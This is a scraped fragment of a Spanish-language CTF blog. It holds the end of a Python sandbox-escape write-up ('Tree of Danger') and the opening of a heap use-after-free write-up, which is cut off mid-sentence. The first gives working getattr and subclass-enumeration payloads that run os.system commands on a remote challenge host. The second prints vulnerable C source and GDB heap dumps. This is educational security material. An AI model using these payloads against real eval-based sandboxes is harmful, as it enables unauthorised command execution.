SafetyCorp are not liable for any accidents that may occur while using SafetyCalc \u0026gt; getattr() Unsafe command detected! The snake approaches... $ python3 util.py Welcome to SafetyCalc (tm)! Note: SafetyCorp are not liable for any accidents that may occur while using SafetyCalc \u0026gt; {1: getattr()} Something bad happened! getattr expected at least 2 arguments, got 0  ¿Puedes ver las diferencias? No podemos ejecutar getattr directamente, pero sí como valor de un dict.\nVamos a jugar un poco con algunos payloads. Estaré usando HackTricks para aprender un poco sobre técnicas de escape de sandbox. Por ejemplo, es trivial saltarnos la comprobación de guiones bajos usando \\x5f (representación hexadecimal):\n$ python3 util.py Welcome to SafetyCalc (tm)! Note: SafetyCorp are not liable for any accidents that may occur while using SafetyCalc \u0026gt; {1: getattr(math, '\\x5f\\x5fclass\\x5f\\x5f')} {1: \u0026lt;class 'module'\u0026gt;}  Necesitamos encontrar algún módulo que nos permita ejecutar comandos (por ejemplo, os). Según HackTricks, tenemos que enumerar las subclases de un objeto built-in con el siguiente payload:\n().__class__.__base__.__subclasses__()  Pero tenemos que adaptarlo a nuestra situación:\n$ python3 util.py Welcome to SafetyCalc (tm)! Note: SafetyCorp are not liable for any accidents that may occur while using SafetyCalc \u0026gt; {1: getattr(getattr(getattr((), '\\x5f\\x5fclass\\x5f\\x5f'), '\\x5f\\x5fbase\\x5f\\x5f'), '\\x5f\\x5fsubclasses\\x5f\\x5f')()} {1: [\u0026lt;class 'type'\u0026gt;, \u0026lt;class 'async_generator'\u0026gt;, \u0026lt;class 'int'\u0026gt;, \u0026lt;class 'bytearray_iterator'\u0026gt;, \u0026lt;class 'bytearray'\u0026gt;, \u0026lt;class 'bytes_iterator'\u0026gt;, \u0026lt;class 'bytes'\u0026gt;, \u0026lt;class 'builtin_function_or_method'\u0026gt;, \u0026lt;class 'callable_iterator'\u0026gt;, \u0026lt;class 'PyCapsule'\u0026gt;, \u0026lt;class 'cell'\u0026gt;, \u0026lt;class 'classmethod_descriptor'\u0026gt;, \u0026lt;class 'classmethod'\u0026gt;, \u0026lt;class 'code'\u0026gt;, \u0026lt;class 'complex'\u0026gt;, \u0026lt;class 'coroutine'\u0026gt;, \u0026lt;class 'dict_items'\u0026gt;, \u0026lt;class 'dict_itemiterator'\u0026gt;, \u0026lt;class 'dict_keyiterator'\u0026gt;, \u0026lt;class 'dict_valueiterator'\u0026gt;, \u0026lt;class 'dict_keys'\u0026gt;, \u0026lt;class 'mappingproxy'\u0026gt;, \u0026lt;class 'dict_reverseitemiterator'\u0026gt;, \u0026lt;class 'dict_reversekeyiterator'\u0026gt;, \u0026lt;class 'dict_reversevalueiterator'\u0026gt;, \u0026lt;class 'dict_values'\u0026gt;, \u0026lt;class 'dict'\u0026gt;, \u0026lt;class 'ellipsis'\u0026gt;, \u0026lt;class 'enumerate'\u0026gt;, \u0026lt;class 'float'\u0026gt;, \u0026lt;class 'frame'\u0026gt;, \u0026lt;class 'frozenset'\u0026gt;, \u0026lt;class 'function'\u0026gt;, \u0026lt;class 'generator'\u0026gt;, \u0026lt;class 'getset_descriptor'\u0026gt;, \u0026lt;class 'instancemethod'\u0026gt;, \u0026lt;class 'list_iterator'\u0026gt;, \u0026lt;class 'list_reverseiterator'\u0026gt;, \u0026lt;class 'list'\u0026gt;, \u0026lt;class 'longrange_iterator'\u0026gt;, \u0026lt;class 'member_descriptor'\u0026gt;, \u0026lt;class 'memoryview'\u0026gt;, \u0026lt;class 'method_descriptor'\u0026gt;, \u0026lt;class 'method'\u0026gt;, \u0026lt;class 'moduledef'\u0026gt;, \u0026lt;class 'module'\u0026gt;, \u0026lt;class 'odict_iterator'\u0026gt;, \u0026lt;class 'pickle.PickleBuffer'\u0026gt;, \u0026lt;class 'property'\u0026gt;, \u0026lt;class 'range_iterator'\u0026gt;, \u0026lt;class 'range'\u0026gt;, \u0026lt;class 'reversed'\u0026gt;, \u0026lt;class 'symtable entry'\u0026gt;, \u0026lt;class 'iterator'\u0026gt;, \u0026lt;class 'set_iterator'\u0026gt;, \u0026lt;class 'set'\u0026gt;, \u0026lt;class 'slice'\u0026gt;, \u0026lt;class 'staticmethod'\u0026gt;, \u0026lt;class 'stderrprinter'\u0026gt;, \u0026lt;class 'super'\u0026gt;, \u0026lt;class 'traceback'\u0026gt;, \u0026lt;class 'tuple_iterator'\u0026gt;, \u0026lt;class 'tuple'\u0026gt;, \u0026lt;class 'str_iterator'\u0026gt;, \u0026lt;class 'str'\u0026gt;, \u0026lt;class 'wrapper_descriptor'\u0026gt;, \u0026lt;class 'types.GenericAlias'\u0026gt;, \u0026lt;class 'anext_awaitable'\u0026gt;, \u0026lt;class 'async_generator_asend'\u0026gt;, \u0026lt;class 'async_generator_athrow'\u0026gt;, \u0026lt;class 'async_generator_wrapped_value'\u0026gt;, \u0026lt;class 'coroutine_wrapper'\u0026gt;, \u0026lt;class 'InterpreterID'\u0026gt;, \u0026lt;class 'managedbuffer'\u0026gt;, \u0026lt;class 'method-wrapper'\u0026gt;, \u0026lt;class 'types.SimpleNamespace'\u0026gt;, \u0026lt;class 'NoneType'\u0026gt;, \u0026lt;class 'NotImplementedType'\u0026gt;, \u0026lt;class 'weakref.CallableProxyType'\u0026gt;, \u0026lt;class 'weakref.ProxyType'\u0026gt;, \u0026lt;class 'weakref.ReferenceType'\u0026gt;, \u0026lt;class 'types.UnionType'\u0026gt;, \u0026lt;class 'EncodingMap'\u0026gt;, \u0026lt;class 'fieldnameiterator'\u0026gt;, \u0026lt;class 'formatteriterator'\u0026gt;, \u0026lt;class 'BaseException'\u0026gt;, \u0026lt;class 'hamt'\u0026gt;, \u0026lt;class 'hamt_array_node'\u0026gt;, \u0026lt;class 'hamt_bitmap_node'\u0026gt;, \u0026lt;class 'hamt_collision_node'\u0026gt;, \u0026lt;class 'keys'\u0026gt;, \u0026lt;class 'values'\u0026gt;, \u0026lt;class 'items'\u0026gt;, \u0026lt;class '_contextvars.Context'\u0026gt;, \u0026lt;class '_contextvars.ContextVar'\u0026gt;, \u0026lt;class '_contextvars.Token'\u0026gt;, \u0026lt;class 'Token.MISSING'\u0026gt;, \u0026lt;class 'filter'\u0026gt;, \u0026lt;class 'map'\u0026gt;, \u0026lt;class 'zip'\u0026gt;, \u0026lt;class '_frozen_importlib._ModuleLock'\u0026gt;, \u0026lt;class '_frozen_importlib._DummyModuleLock'\u0026gt;, \u0026lt;class '_frozen_importlib._ModuleLockManager'\u0026gt;, \u0026lt;class '_frozen_importlib.ModuleSpec'\u0026gt;, \u0026lt;class '_frozen_importlib.BuiltinImporter'\u0026gt;, \u0026lt;class '_frozen_importlib.FrozenImporter'\u0026gt;, \u0026lt;class '_frozen_importlib._ImportLockContext'\u0026gt;, \u0026lt;class '_thread.lock'\u0026gt;, \u0026lt;class '_thread.RLock'\u0026gt;, \u0026lt;class '_thread._localdummy'\u0026gt;, \u0026lt;class '_thread._local'\u0026gt;, \u0026lt;class '_io._IOBase'\u0026gt;, \u0026lt;class '_io._BytesIOBuffer'\u0026gt;, \u0026lt;class '_io.IncrementalNewlineDecoder'\u0026gt;, \u0026lt;class 'posix.ScandirIterator'\u0026gt;, \u0026lt;class 'posix.DirEntry'\u0026gt;, \u0026lt;class '_frozen_importlib_external.WindowsRegistryFinder'\u0026gt;, \u0026lt;class '_frozen_importlib_external._LoaderBasics'\u0026gt;, \u0026lt;class '_frozen_importlib_external.FileLoader'\u0026gt;, \u0026lt;class '_frozen_importlib_external._NamespacePath'\u0026gt;, \u0026lt;class '_frozen_importlib_external._NamespaceLoader'\u0026gt;, \u0026lt;class '_frozen_importlib_external.PathFinder'\u0026gt;, \u0026lt;class '_frozen_importlib_external.FileFinder'\u0026gt;, \u0026lt;class 'codecs.Codec'\u0026gt;, \u0026lt;class 'codecs.IncrementalEncoder'\u0026gt;, \u0026lt;class 'codecs.IncrementalDecoder'\u0026gt;, \u0026lt;class 'codecs.StreamReaderWriter'\u0026gt;, \u0026lt;class 'codecs.StreamRecoder'\u0026gt;, \u0026lt;class '_abc._abc_data'\u0026gt;, \u0026lt;class 'abc.ABC'\u0026gt;, \u0026lt;class 'collections.abc.Hashable'\u0026gt;, \u0026lt;class 'collections.abc.Awaitable'\u0026gt;, \u0026lt;class 'collections.abc.AsyncIterable'\u0026gt;, \u0026lt;class 'collections.abc.Iterable'\u0026gt;, \u0026lt;class 'collections.abc.Sized'\u0026gt;, \u0026lt;class 'collections.abc.Container'\u0026gt;, \u0026lt;class 'collections.abc.Callable'\u0026gt;, \u0026lt;class 'os._wrap_close'\u0026gt;, \u0026lt;class '_sitebuiltins.Quitter'\u0026gt;, \u0026lt;class '_sitebuiltins._Printer'\u0026gt;, \u0026lt;class '_sitebuiltins._Helper'\u0026gt;, \u0026lt;class '_distutils_hack._TrivialRe'\u0026gt;, \u0026lt;class '_distutils_hack.DistutilsMetaFinder'\u0026gt;, \u0026lt;class '_distutils_hack.shim'\u0026gt;, \u0026lt;class 'types.DynamicClassAttribute'\u0026gt;, \u0026lt;class 'types._GeneratorWrapper'\u0026gt;, \u0026lt;class 'warnings.WarningMessage'\u0026gt;, \u0026lt;class 'warnings.catch_warnings'\u0026gt;, \u0026lt;class 'importlib._abc.Loader'\u0026gt;, \u0026lt;class 'itertools.accumulate'\u0026gt;, \u0026lt;class 'itertools.combinations'\u0026gt;, \u0026lt;class 'itertools.combinations_with_replacement'\u0026gt;, \u0026lt;class 'itertools.cycle'\u0026gt;, \u0026lt;class 'itertools.dropwhile'\u0026gt;, \u0026lt;class 'itertools.takewhile'\u0026gt;, \u0026lt;class 'itertools.islice'\u0026gt;, \u0026lt;class 'itertools.starmap'\u0026gt;, \u0026lt;class 'itertools.chain'\u0026gt;, \u0026lt;class 'itertools.compress'\u0026gt;, \u0026lt;class 'itertools.filterfalse'\u0026gt;, \u0026lt;class 'itertools.count'\u0026gt;, \u0026lt;class 'itertools.zip_longest'\u0026gt;, \u0026lt;class 'itertools.pairwise'\u0026gt;, \u0026lt;class 'itertools.permutations'\u0026gt;, \u0026lt;class 'itertools.product'\u0026gt;, \u0026lt;class 'itertools.repeat'\u0026gt;, \u0026lt;class 'itertools.groupby'\u0026gt;, \u0026lt;class 'itertools._grouper'\u0026gt;, \u0026lt;class 'itertools._tee'\u0026gt;, \u0026lt;class 'itertools._tee_dataobject'\u0026gt;, \u0026lt;class 'operator.attrgetter'\u0026gt;, \u0026lt;class 'operator.itemgetter'\u0026gt;, \u0026lt;class 'operator.methodcaller'\u0026gt;, \u0026lt;class 'operator.attrgetter'\u0026gt;, \u0026lt;class 'operator.itemgetter'\u0026gt;, \u0026lt;class 'operator.methodcaller'\u0026gt;, \u0026lt;class 'reprlib.Repr'\u0026gt;, \u0026lt;class 'collections.deque'\u0026gt;, \u0026lt;class '_collections._deque_iterator'\u0026gt;, \u0026lt;class '_collections._deque_reverse_iterator'\u0026gt;, \u0026lt;class '_collections._tuplegetter'\u0026gt;, \u0026lt;class 'collections._Link'\u0026gt;, \u0026lt;class 'functools.partial'\u0026gt;, \u0026lt;class 'functools._lru_cache_wrapper'\u0026gt;, \u0026lt;class 'functools.KeyWrapper'\u0026gt;, \u0026lt;class 'functools._lru_list_elem'\u0026gt;, \u0026lt;class 'functools.partialmethod'\u0026gt;, \u0026lt;class 'functools.singledispatchmethod'\u0026gt;, \u0026lt;class 'functools.cached_property'\u0026gt;, \u0026lt;class 'contextlib.ContextDecorator'\u0026gt;, \u0026lt;class 'contextlib.AsyncContextDecorator'\u0026gt;, \u0026lt;class 'contextlib._GeneratorContextManagerBase'\u0026gt;, \u0026lt;class 'contextlib._BaseExitStack'\u0026gt;, \u0026lt;class 'enum.auto'\u0026gt;, \u0026lt;enum 'Enum'\u0026gt;, \u0026lt;class 're.Pattern'\u0026gt;, \u0026lt;class 're.Match'\u0026gt;, \u0026lt;class '_sre.SRE_Scanner'\u0026gt;, \u0026lt;class 'sre_parse.State'\u0026gt;, \u0026lt;class 'sre_parse.SubPattern'\u0026gt;, \u0026lt;class 'sre_parse.Tokenizer'\u0026gt;, \u0026lt;class 're.Scanner'\u0026gt;, \u0026lt;class 'ast.AST'\u0026gt;, \u0026lt;class 'ast.NodeVisitor'\u0026gt;, \u0026lt;class 'typing._Final'\u0026gt;, \u0026lt;class 'typing._Immutable'\u0026gt;, \u0026lt;class 'typing._TypeVarLike'\u0026gt;, \u0026lt;class 'typing.Generic'\u0026gt;, \u0026lt;class 'typing._TypingEmpty'\u0026gt;, \u0026lt;class 'typing._TypingEllipsis'\u0026gt;, \u0026lt;class 'typing.Annotated'\u0026gt;, \u0026lt;class 'typing.NamedTuple'\u0026gt;, \u0026lt;class 'typing.TypedDict'\u0026gt;, \u0026lt;class 'typing.NewType'\u0026gt;, \u0026lt;class 'typing.io'\u0026gt;, \u0026lt;class 'typing.re'\u0026gt;]}  El módulo os se puede encontrar en el índice 137:\n$ python3 util.py Welcome to SafetyCalc (tm)! Note: SafetyCorp are not liable for any accidents that may occur while using SafetyCalc \u0026gt; {1: getattr(getattr(getattr((), '\\x5f\\x5fclass\\x5f\\x5f'), '\\x5f\\x5fbase\\x5f\\x5f'), '\\x5f\\x5fsubclasses\\x5f\\x5f')()[137]} {1: \u0026lt;class 'os._wrap_close'\u0026gt;}  En este punto, podemos usar el siguiente payload:\n[ x.__init__.__globals__ forxin''.__class__.__base__.__subclasses__() if\"'os.\"instr(x) ][0]['system']('ls')  Básicamente, (\u0026lt;class 'os._wrap_close'\u0026gt;).__init__.__globals__['system']('ls'). Adaptado a nuestra situación:\n$ python3 util.py \u0026gt; {1: getattr(getattr(getattr(getattr(getattr((), '\\x5f\\x5fclass\\x5f\\x5f'), '\\x5f\\x5fbase\\x5f\\x5f'), '\\x5f\\x5fsubclasses\\x5f\\x5f')()[137], '\\x5f\\x5finit\\x5f\\x5f'), '\\x5f\\x5fglobals\\x5f\\x5f')['system']('whoami')} rocky {1: 0}  Genial, vamos a probar en la instancia remota:\n$ nc 64.227.43.55 30570 Welcome to SafetyCalc (tm)! Note: SafetyCorp are not liable for any accidents that may occur while using SafetyCalc \u0026gt; {1: getattr(getattr(getattr(getattr(getattr((), '\\x5f\\x5fclass\\x5f\\x5f'), '\\x5f\\x5fbase\\x5f\\x5f'), '\\x5f\\x5fsubclasses\\x5f\\x5f')()[137], '\\x5f\\x5finit\\x5f\\x5f'), '\\x5f\\x5fglobals\\x5f\\x5f')['system']('whoami')} Something bad happened! 'wrapper_descriptor' object has no attribute '__globals__' \u0026gt; ^C  Parece que no está funcionando. Curiosamente, si enumeramos las subclases otra vez, veremos que os aparece en el índice 138. Entonces, solo tenemos que corregirlo y tendremos ejecución remota de comandos para capturar la flag:\n$ nc 64.227.43.55 30570 Welcome to SafetyCalc (tm)! Note: SafetyCorp are not liable for any accidents that may occur while using SafetyCalc \u0026gt; {1: getattr(getattr(getattr((), '\\x5f\\x5fclass\\x5f\\x5f'), '\\x5f\\x5fbase\\x5f\\x5f'), '\\x5f\\x5fsubclasses\\x5f\\x5f')()[138]} {1: \u0026lt;class 'os._wrap_close'\u0026gt;} \u0026gt; {1: getattr(getattr(getattr(getattr(getattr((), '\\x5f\\x5fclass\\x5f\\x5f'), '\\x5f\\x5fbase\\x5f\\x5f'), '\\x5f\\x5fsubclasses\\x5f\\x5f')()[138], '\\x5f\\x5finit\\x5f\\x5f'), '\\x5f\\x5fglobals\\x5f\\x5f')['system']('whoami')} ctf {1: 0} \u0026gt; {1: getattr(getattr(getattr(getattr(getattr((), '\\x5f\\x5fclass\\x5f\\x5f'), '\\x5f\\x5fbase\\x5f\\x5f'), '\\x5f\\x5fsubclasses\\x5f\\x5f')()[138], '\\x5f\\x5finit\\x5f\\x5f'), '\\x5f\\x5fglobals\\x5f\\x5f')['system']('ls')} app bin boot dev etc flag.txt home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var {1: 0} \u0026gt; {1: getattr(getattr(getattr(getattr(getattr((), '\\x5f\\x5fclass\\x5f\\x5f'), '\\x5f\\x5fbase\\x5f\\x5f'), '\\x5f\\x5fsubclasses\\x5f\\x5f')()[138], '\\x5f\\x5finit\\x5f\\x5f'), '\\x5f\\x5fglobals\\x5f\\x5f')['system']('cat flag.txt')} HTB{45ts_are_pretty_c00l!!!} {1: 0}  ","image":"/images/misc.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/misc/tree-of-danger/","section":"ctf","summary":"Análisis de Código Estático. Escapada de sandbox en Python","time":5,"title":"Tree of Danger"},{"contents":"Se nos proporciona un binario de 32 bits llamado vuln:\nArch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000)  Tenemos también el código fuente en C:\n#include \u0026lt;stdint.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;ctype.h\u0026gt; #define FLAG_BUFFER 200 #define LINE_BUFFER_SIZE 20 typedef struct { uintptr_t (*whatToDo)(); char *username; } cmd; char choice; cmd *user; void hahaexploitgobrrr() { char buf[FLAG_BUFFER]; FILE *f = fopen(\"flag.txt\", \"r\"); fgets(buf, FLAG_BUFFER, f); fprintf(stdout, \"%s\\n\", buf); fflush(stdout); } char* getsline() { getchar(); char *line = malloc(100), *linep = line; size_t lenmax = 100, len = lenmax; int c; if (line == NULL) return NULL; for (;;) { c = fgetc(stdin); if (c == EOF) break; if (--len == 0) { len = lenmax; char *linen = realloc(linep, lenmax *= 2); if (linen == NULL) { free(linep); return NULL; } line = linen + (line - linep); linep = linen; } if ((*line++ = c) == '\\n') break; } *line = '\\0'; return linep; } void doProcess(cmd* obj) { (*obj-\u0026gt;whatToDo)(); } void s() { printf(\"OOP! Memory leak...%p\\n\", hahaexploitgobrrr); puts(\"Thanks for subsribing! I really recommend becoming a premium member!\"); } void p() { puts(\"Membership pending... (There's also a super-subscription you can also get for twice the price!)\"); } void m() { puts(\"Account created.\"); } void leaveMessage() { puts(\"I only read premium member messages but you can \"); puts(\"try anyways:\"); char* msg = (char*) malloc(8); read(0, msg, 8); } void i() { char response; puts(\"You're leaving already(Y/N)?\"); scanf(\" %c\", \u0026amp;response); if (toupper(response) == 'Y') { puts(\"Bye!\"); free(user); } else { puts(\"Ok. Get premium membership please!\"); } } void printMenu() { puts(\"Welcome to my stream! ^W^\"); puts(\"==========================\"); puts(\"(S)ubscribe to my channel\"); puts(\"(I)nquire about account deletion\"); puts(\"(M)ake an Twixer account\"); puts(\"(P)ay for premium membership\"); puts(\"(l)eave a message(with or without logging in)\"); puts(\"(e)xit\"); } void processInput() { scanf(\" %c\", \u0026amp;choice); choice = toupper(choice); switch (choice) { case 'S': if (user) { user-\u0026gt;whatToDo = (void*) s; } else { puts(\"Not logged in!\"); } break; case 'P': user-\u0026gt;whatToDo = (void*) p; break; case 'I': user-\u0026gt;whatToDo = (void*) i; break; case 'M': user-\u0026gt;whatToDo = (void*) m; puts(\"===========================\"); puts(\"Registration: Welcome to Twixer!\"); puts(\"Enter your username: \"); user-\u0026gt;username = getsline(); break; case 'L': leaveMessage(); break; case 'E': exit(0); default: puts(\"Invalid option!\"); exit(1); } } int main() { setbuf(stdout, NULL); user = (cmd*) malloc(sizeof(user)); while (1) { printMenu(); processInput(); doProcess(user); } return 0; }  Básicamente, el programa tiene cuatro funcionalidades:\n Fugar la dirección de memoria de la función hahaexploitgobrrr (S) Crear una cuenta (M) Borrar una cuenta (I) Dejar un mensaje (L)  La clave está en que la variable user se libera mediante free, pero el puntero a la variable no cambia. Además, el mensaje (L) se guarda en el heap usando malloc.\nPor tanto, si creamos una cuenta (M), luego la borramos (I) usando free y después dejamos un mensaje (L) con malloc, el puntero a user apuntará al mensaje, debido a que malloc reutilizará la dirección de la memoria recién liberada.\nLa estructura de user es:\ntypedef struct { uintptr_t (*whatToDo)(); char *username; } cmd;  Tiene un puntero a una función whatToDo) y un puntero a una cadena de caracteres (username), por lo que el tamaño de la estructura es de 8 bytes.\nDependiendo de la opción que pongamos, el puntero a la función será s, i, m, p o leaveMessage. Luego, se llama a la función doProcess:\nvoid doProcess(cmd* obj) { (*obj-\u0026gt;whatToDo)(); }  Que llama a la función a la que apunta whatToDo.\nTodo este proceso se ejecuta en un bucle infinito:\nint main() { setbuf(stdout, NULL); user = (cmd*) malloc(sizeof(user)); while (1) { printMenu(); processInput(); doProcess(user); } return 0; }  Recordemos la estrategia:\n Fugar la dirección de la función hahaexploitgobrrr (S) Crear una cuenta (M) Borrar la cuenta (I) Dejar un mensaje (L) para sobrescribir whatToDo con la dirección de hahaexploitgobrrr  Estas son las funciones involucradas:\nvoid s() { printf(\"OOP! Memory leak...%p\\n\", hahaexploitgobrrr); puts(\"Thanks for subsribing! I really recommend becoming a premium member!\"); } void leaveMessage() { puts(\"I only read premium member messages but you can \"); puts(\"try anyways:\"); char* msg = (char*) malloc(8); read(0, msg, 8); } void i() { char response; puts(\"You're leaving already(Y/N)?\"); scanf(\" %c\", \u0026amp;response); if (toupper(response) == 'Y') { puts(\"Bye!\"); free(user); } else { puts(\"Ok. Get premium membership please!\"); } }  Como se puede observar, s solamente imprime la dirección de hahaexploitgobrrr:\n$ ./vuln Welcome to my stream! ^W^ ========================== (S)ubscribe to my channel (I)nquire about account deletion (M)ake an Twixer account (P)ay for premium membership (l)eave a message(with or without logging in) (e)xit S OOP! Memory leak...0x80487d6 Thanks for subsribing! I really recommend becoming a premium member!  LuegoleaveMessage lee 8 bytes y los sitúa en el heap utilizando malloc. Y finalmente, i libera la memoria de la estructura de user mediante free (pero el puntero y los datos se mantienen).\nEl proceso de crear una cuenta está en el correspondiente caso de processInput:\ncase 'M': user-\u0026gt;whatToDo = (void*) m; puts(\"===========================\"); puts(\"Registration: Welcome to Twixer!\"); puts(\"Enter your username: \"); user-\u0026gt;username = getsline(); break;  La función getsline puede tomar un montón de datos de la entrada de usuario, pero creo que no existe ninguna vulnerabilidad de desbordamiento aquí.\nVamos a probar nuestra idea con GDB (omitiendo la fuga de memoria):\n$ gdb -q vuln Reading symbols from vuln... (No debugging symbols found in vuln) gef➤ break printMenu Breakpoint 1 at 0x8048b31 gef➤ run Starting program: ./vuln Breakpoint 1, 0x8048b31 in printMenu ()  gef➤ continue Continuing. Starting program: ./vuln Welcome to my stream! ^W^ ========================== (S)ubscribe to my channel (I)nquire about account deletion (M)ake an Twixer account (P)ay for premium membership (l)eave a message(with or without logging in) (e)xit M =========================== Registration: Welcome to Twixer! Enter your username: AAA Account created. Breakpoint 1, 0x8048b31 in printMenu ()  Vamos a ver cuál es la dirección del espacio del heap:\ngef➤ vmmap [ Legend: Code | Heap | Stack ] Start End Offset Perm Path 0x08048000 0x0804a000 0x00000000 r-x ./vuln 0x0804a000 0x0804b000 0x00001000 r-- ./vuln 0x0804b000 0x0804c000 0x00002000 rw- ./vuln 0x0804c000 0x0806e000 0x00000000 rw- [heap] 0xf7dcd000 0xf7dea000 0x00000000 r-- /usr/lib32/libc-2.31.so 0xf7dea000 0xf7f42000 0x0001d000 r-x /usr/lib32/libc-2.31.so 0xf7f42000 0xf7fb2000 0x00175000 r-- /usr/lib32/libc-2.31.so 0xf7fb2000 0xf7fb4000 0x001e4000 r-- /usr/lib32/libc-2.31.so 0xf7fb4000 0xf7fb6000 0x001e6000 rw- /usr/lib32/libc-2.31.so 0xf7fb6000 0xf7fb8000 0x00000000 rw- 0xf7fc9000 0xf7fcb000 0x00000000 rw- 0xf7fcb000 0xf7fcf000 0x00000000 r-- [vvar] 0xf7fcf000 0xf7fd1000 0x00000000 r-x [vdso] 0xf7fd1000 0xf7fd2000 0x00000000 r-- /usr/lib32/ld-2.31.so 0xf7fd2000 0xf7ff0000 0x00001000 r-x /usr/lib32/ld-2.31.so 0xf7ff0000 0xf7ffb000 0x0001f000 r-- /usr/lib32/ld-2.31.so 0xf7ffc000 0xf7ffd000 0x0002a000 r-- /usr/lib32/ld-2.31.so 0xf7ffd000 0xf7ffe000 0x0002b000 rw- /usr/lib32/ld-2.31.so 0xfffdd000 0xffffe000 0x00000000 rw- [stack]  Ahora podemos examinar algunos valores en el heap:\ngef➤ x/120x 0x0804c000 0x804c000:\t0x00000000\t0x00000000\t0x00000000\t0x00000191 0x804c010:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c020:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c030:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c040:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c050:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c060:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c070:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c080:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c090:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c0a0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c0b0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c0c0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c0d0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c0e0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c0f0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c100:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c110:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c120:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c130:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c140:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c150:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c160:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c170:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c180:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c190:\t0x00000000\t0x00000000\t0x00000000\t0x00000011 0x804c1a0:\t0x080489f6\t0x0804c5c0\t0x00000000\t0x00000411 0x804c1b0:\t0x0a414141\t0x00000000\t0x00000000\t0x00000000 0x804c1c0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c1d0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000  Nótese que 0x080489f6 es la dirección de m:\ngef➤ x 0x080489f6 0x80489f6 \u0026lt;m\u0026gt;:\t0x53e58955  Y 0x0804c5c0 es la dirección de la cadena de caracteres AAA:\ngef➤ x/16x 0x0804c5c0 - 0x10 0x804c5b0:\t0x00000000\t0x00000000\t0x00000000\t0x00000071 0x804c5c0:\t0x0a414141\t0x00000000\t0x00000000\t0x00000000 0x804c5d0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c5e0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000  Adicionalmente, podemos encontrar la cadena AAA justo debajo de la dirección de m, pero no es relevante.\nAhora podemos borrar la cuenta utilizando free:\ngef➤ continue Continuing. Welcome to my stream! ^W^ ========================== (S)ubscribe to my channel (I)nquire about account deletion (M)ake an Twixer account (P)ay for premium membership (l)eave a message(with or without logging in) (e)xit I You're leaving already(Y/N)? Y Bye! Breakpoint 1, 0x8048b31 in printMenu ()  Volvamos a ver el heap:\ngef➤ x/120x 0x0804c000 0x804c000:\t0x00000000\t0x00000000\t0x00000000\t0x00000191 0x804c010:\t0x00000001\t0x00000000\t0x00000000\t0x00000000 0x804c020:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c030:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c040:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c050:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c060:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c070:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c080:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c090:\t0x0804c1a0\t0x00000000\t0x00000000\t0x00000000 0x804c0a0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c0b0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c0c0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c0d0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c0e0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c0f0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c100:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c110:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c120:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c130:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c140:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c150:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c160:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c170:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c180:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c190:\t0x00000000\t0x00000000\t0x00000000\t0x00000011 0x804c1a0:\t0x00000000\t0x0804c010\t0x00000000\t0x00000411 0x804c1b0:\t0x0a410a59\t0x00000000\t0x00000000\t0x00000000 0x804c1c0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c1d0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000  Si comparamos el estado actual del heap con el anterior, obtendremos las siguientes diferencias:\n Hay un valor 0x00000001 en la dirección 0x804c010 Hay un valor 0x0804c1a0 en la dirección 0x804c090. Este valor es el puntero a la variable user (también se almacena en el heap) Hay un valor 0x00000000 en la dirección 0x804c1a0, que es el 